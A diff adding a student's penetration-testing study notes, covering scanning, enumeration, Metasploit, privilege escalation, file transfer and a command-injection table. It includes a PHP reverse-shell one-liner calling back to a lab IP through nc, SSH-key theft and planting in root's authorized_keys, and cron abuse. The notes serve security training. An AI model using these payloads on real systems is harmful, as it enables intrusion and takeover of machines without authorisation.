@@ -1,0 +1,213 @@
+﻿# **General Penetration Testing Tools**
+Here are initial notes I found useful while completing this module of the certification. Please add on to it, and learn from it.
+
+- Service Scanning
+  - Nmap
+    - Useful scans
+      - nmap <target>
+      - **> nmap -sV -sC -p- <target>**
+        - sC: obtain more information
+        - sV: get version (useful for finding exploits)
+        - p-: checks all 65,535 TCP ports
+      - nmap -sV -p21 <target>
+        - runs nmap on target port (FTP in this case)
+        - gets version
+      - nmap --script smb-os-discovery.nse -p445 <target>
+        - Scans SMB (Server Message Block)
+          - Many attack vectors start here
+          - EternalBlue is a prevalent exploit
+      - nmap -A -p445 <target>
+        - A: aggressive scan
+    - We can use scripts for better scans
+  - FTP
+    - Useful scans
+      - **> ftp -p <target>**
+        - ls/cd
+        - get
+  - Netcat
+  - SMB (Server Message Block)
+    - Useful commands
+      - **> smbclient -N -L \\\\<target>**
+        - N: suppresses password prompt
+        - L retrieve list of available shares on the network
+      - smbclient \\\\<target>\\users
+        - Connects to users share as guest user
+      - smbclient -U bob \\\\<target>\\users
+        - Connects to users share as bob
+  - SNMP
+    - Useful commands
+      - snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.1.5.0
+        - snmpwalk: queries network device regarding SNMP
+        - v 2c: version 2c (common version of SNMP used for querying)
+        - c public: community string; public is default, and means read-only; acts like a password for SNMP access
+        - 1.3.6.1.2.1.1.5.0: OID (Object Identifier being queried)
+  - Onesixtyone
+    - Used to brute force community string names
+    - onesixtyone -c <dictionary file> <target>
+- Web Enumeration
+  - **Gobuster**
+    - Useful commands
+      - gobuster dir -u http://<target>/ -w <wordlist>
+        - /usr/share/wordlists/dirbuster
+      - gobuster dns -d <target> -w /usr/share/SecLists/Discovery/DNS/namelist.txt
+        - Used to enumerate subdomains
+        - Prereqs
+          - git clone [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
+          - sudo apt install seclists -y
+  - **cURL**
+    - Useful commands
+      - curl -IL <target>
+        - Gets banner of target
+  - **whatweb**
+    - Gets useful info about web server
+    - whatweb <target>
+  - **robots.txt**
+    - Can be useful for seeing files not meant to be seen by public
+  - Looking at source code often comes in handy (CTRL+U)
+- Public Exploits
+  - You can often find exploits by searching for the application name, followed by “exploit”. Ex. windows 7 smb exploit
+  - **searchsploit**
+    - Used to search for public exploits/vulnerabilities for any given application
+    - Installation
+      - sudo apt install exploitdb -y
+    - Use
+      - searchsploit <application>
+        - searchsploit openssh 7.2
+  - **Metasploit**
+    - Metasploit Framework (MSF) contains built-in exploits
+    - With Metasploit we can:
+      - Easily exploit common vulns
+      - Run recon scripts
+      - Verification scripts to confirm vulnerability of target without compromising it
+      - Meterpreter - Connect to shell and run commands on compromised targets
+      - Post-exploitation and pivoting
+    - Use
+      - systemctl start postgresql - Do not always need this line; may need to run as sudo
+      - msfconsole
+      - search exploit <exploit>
+        - search exploit eternalblue
+        - This command may find exploits. To use them we can:
+          - use <exploit>
+      - use <exploit>
+        - show options
+        - Set all necessary options
+        - check
+        - run or > exploit
+      - shell
+      - /bin/bash -i
+- Privilege Escalation
+  - Privilege Escalation Checklist
+    - Many privilege escalation checklists can be found online
+    - These include:
+      - HackTricks
+        - book.hacktricks.xyz
+      - PayloadOfAllThings
+        - GitHub repo which contains, well, exploits for all sorts of vulns
+        - Reverse Shell Payload
+          - <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9999 >/tmp/f'); ?>
+        - Shell Stabalizer
+          - /usr/bin/script -qc /bin/bash /dev/null
+  - Enumeration Scripts
+    - Common Scripts
+      - LinEnum
+      - linuxprivchecker
+      - Privilege Escalation Awesome Scripts Suite (PEASS)
+        - LinPEAS:
+          - Provides valuable insight into the system
+          - Ex.
+            - ./linpeas.sh
+          - git clone <https://github.com/rebootuser/LinEnum.git> (my system)
+          - cd /tmp (target system)
+          - which wget (confirm target system has it, if not use something else)
+          - python3 -m http.server 80 (my system [on 8080 if 80 taken])
+          - wget http://<my\_ip>/LinEnum.sh
+          - chmod +x [LinEnum.sh](http://LinEnum.sh) (target machine)
+          - ./LinEnum.sh (target machine)
+  - Kernel Exploits
+    - Best for old operating systems (especially if not maintained)
+    - We can *searchsploit* the version in order to find a CVE
+    - **Be careful to run kernel exploits on production systems**
+  - Vulnerable Software
+    - Software may be vulnerable, so we should determine installed software via *dpkg -l*, and search for public exploits in this software (especially for older systems)
+  - User Privileges
+    - We can exploit a user’s privileges (especially if they have higher than necessary)
+      - sudo
+        - sudo -l
+          - This tells us what access we have when using sudo
+            - If we see the following:
+              - sudo -l
+              - (user : user) NOPASSWD: /bin/echo
+              - You can run
+              - sudo -u user /bin/echo
+          - GTFOBins contains exploits for many commands which can be exploited via sudo
+          - LOLBAS may also be helpful
+      - SUID
+      - Windows Token Privileges
+  - Scheduled Tasks
+    - We can exploit scheduled tasks by
+      - Add new scheduled task / cron job
+      - Trick them to execute malicious software
+    - If we have write creds on the following we can do the above:
+      - /etc/crontab
+      - /etc/cron.d
+      - /var/spool/cron/crontabs/root
+  - Exposed Credentials
+    - Common in configuration (bash\_history/PSReadLine) and log files
+    - Credentials made be found using scripts
+      - ./linpeas.sh
+    - You can sign in via > su -
+  - SSH Keys
+    - If we have read access over .ssh dir, we can view the id\_rsa and similar kes
+      - Found in /home/user/.ssh or /root/.ssh
+      - We can copy it to our machine, and then log in via -i
+      - vim id\_rsa
+      - chmod 600 id\_rsa
+      - ssh root@<target> -i id\_rsa
+    - We can also place our public key in the user’s .ssh
+      - ssh-keygen -f key
+      - This gives us 2 files. key and key.pub
+      - We can add key.pub to authorized keys:
+        - /.ssh/authorized\_keys
+      - We can use the following to do all of this at once
+        - echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized\_keys
+        - We should now be able to log in via our key
+        - ssh root@<target> -i key
+- Transferring Files
+  - Purpose: We often need to move files from a local machine to a remote machine (such as scripts)
+  - Using wget
+    - cd /filepath (or other dir)
+    - python3 -m http.server 8000
+    - wget http://<target>:8000/file or > curl http://<target>/file -o file
+  - Using scp
+    - If we have ssh credentials, we can use scp
+      - scp file user@remotehost:/filepath/file
+  - Using Base64
+    - Fun trick if we are not able to do any of the above
+    - We can encode the file in base64, and then decode it on the server
+      - base64 shell -w 0
+    - Then decode
+      - echo base64\_output | base64 -d > shell
+  - Validate file transfer
+    - Validate a successful file transfer
+      - file *filename*
+    - Ensure it did not break during encoding/decoding
+      - md5sum *filename* (on both machines)
+  - Command Injection Methods
+
+|**Injection Operator**|**Injection Character**|**URL-Encoded Character**|**Executed Command**|
+| :-: | :-: | :-: | :-: |
+|Semicolon|;|%3b|Both|
+|New Line|\n|%0a|Both|
+|Background|&|%26|Both (second output generally shown first)|
+|Pipe|||%7c|Both (only second output is shown)|
+|AND|&&|%26%26|Both (only if first succeeds)|
+|OR||||%7c%7c|Second (only if first fails)|
+|Sub-Shell|``|%60%60|Both (Linux-only)|
+|Sub-Shell|$()|%24%28%29|Both (Linux-only)|
+|Tab|N/A|%09|N/A|
+
+- **Useful Github thingies**
+  - SecLists > <https://github.com/danielmiessler/SecLists/>
+    - collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
+  - Payload all the things > <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master>
+    - A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques !
